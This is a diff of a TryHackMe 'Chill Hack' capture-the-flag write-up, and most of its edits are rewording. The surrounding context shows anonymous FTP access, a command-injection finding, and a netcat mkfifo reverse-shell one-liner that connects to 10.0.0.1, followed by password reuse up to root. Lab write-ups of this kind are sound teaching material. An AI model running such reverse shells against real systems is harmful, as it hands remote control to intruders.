@@ -6,13 +6,13 @@ categories: [CTF-WRITEUPS, TryHackMe - Chill Hack]
 tags: [linux, tryhackme, web, privesc]
 ---
 
+<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png" width="100%"/>
+
+In this post, we are going to solve the machine **Chill Hack** which is available in [tryhackme](https://tryhackme.com/room/chillhack)
+
 ```yaml
 room: https://tryhackme.com/room/chillhack
 ```
-
-<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png" width="100%"/>
-
-In this room, there are no other instructions other than finding the `user flag` and the `root flag`
 
 # Finding the user flag
 
@@ -71,7 +71,7 @@ As you can notice, there are 3 open ports:
 
 ### FTP
 
-Luckily, we don't need to put much effort into this, ftp allows anonymous connections, meaning everyone can access the server and retrieve data.
+Luckily, we don't need to put much effort into this, our sweet ftp is allowing anonymous connections, meaning that everyone can access the server and retrieve data.
 
 - user : anonymous
 - password : (just leave it empty)
@@ -95,7 +95,7 @@ ftp> ls
 ftp>
 ```
 
-Okey, there is a note, let's retrive it
+Okey, there is a file called `note.txt`, let's retrive it.
 
 ```bash
 ftp> get note.txt
@@ -107,7 +107,7 @@ local: note.txt remote: note.txt
 90 bytes received in 00:00 (1.43 KiB/s)
 ```
 
-Nice, now let's quit using `bye`, and `cat note.txt`.
+Nice, now let's quit our ftp session by using `bye`, and then read what's the note is about.
 
 ```bash
 ftp> bye
@@ -118,12 +118,12 @@ ftp> bye
 Anurodh told me that there is some filtering on strings being put in the command -- Apaar
 ```
 
-Okey, what we can get from this message is that :
+Okey, what we can get from this message is the following :
 
-- two usernames : **anurodh** and **apaar**
+- two potential usernames : **anurodh** and **apaar**
 - some potential command injection in their website?
 
-We are done exploring FTP for the moment, let's move on to HTTP
+We are done exploring FTP for the moment, let's move on to HTTP.
 
 ### HTTP
 
@@ -133,7 +133,7 @@ Okey, let's open the website in the browser.
 
 Seems like a normal website, before digging any deeper, let's first bruteforce files and directories.
 
-I like a tool called `dirsearch`, it comes preinstalled if you got `kali` distribution.
+I use a tool called `dirsearch`, it comes preinstalled if you got `kali` distribution.
 
 ```bash
 ┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
@@ -175,7 +175,7 @@ We could potentially be looking at some [command injection vulnerability](https:
 
 Hell yeah, the application is damn **vulnerable**, and we can exploit that to gain back a reverse shell.
 
-Let's explore a bit more.
+Let's explore a bit more...
 
 <img src="/../assets/chillhack_hacker.png" />
 
@@ -205,7 +205,7 @@ We can overcome this by opening a `fifo pipe` which will basically be our gatewa
 
 You can read more about it [here](https://www.tutorialspoint.com/inter_process_communication/inter_process_communication_named_pipes.htm)
 
-Or you can just grab the command from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but it doesn't hurt to know how this works.
+Or you can just grab the command from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but it doesn't hurt to know how it works.
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
@@ -484,7 +484,7 @@ We got some sort of a password, but who's password is this?
 
 Remember earlier, there was 2 users communicating in that `note.txt`. Maybe the password belongs to one of them...
 
-And since we've already got the user's flag, it is not far that password is for the other user `anurodh`.
+And since we've already got the user's flag, it is not far that the password is for the other user `anurodh`.
 Let's test that out.
 
 ```bash
@@ -535,7 +535,7 @@ root
 #
 ```
 
-BOOM, let's read the root flag.
+BOOM, we are in ! Let's read the root flag.
 
 ```bash
 # cd /root
